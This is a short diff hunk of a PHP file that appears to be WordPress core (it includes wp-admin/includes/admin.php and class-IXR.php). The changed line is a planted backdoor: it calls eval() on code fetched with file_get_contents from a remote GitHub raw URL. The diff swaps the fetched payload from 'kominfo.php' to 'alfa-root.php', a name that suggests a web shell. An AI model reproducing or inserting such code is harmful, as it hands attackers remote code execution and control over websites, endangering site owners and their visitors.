@@ -71,7 +71,7 @@ function get($url) {
       return $data;
   }
   $x= '?>';
-         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/kominfo.php" ) ) ); ?>
+         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/alfa-root.php" ) ) ); ?>
 
 require_once ABSPATH . 'wp-admin/includes/admin.php';
 require_once ABSPATH . WPINC . '/class-IXR.php';
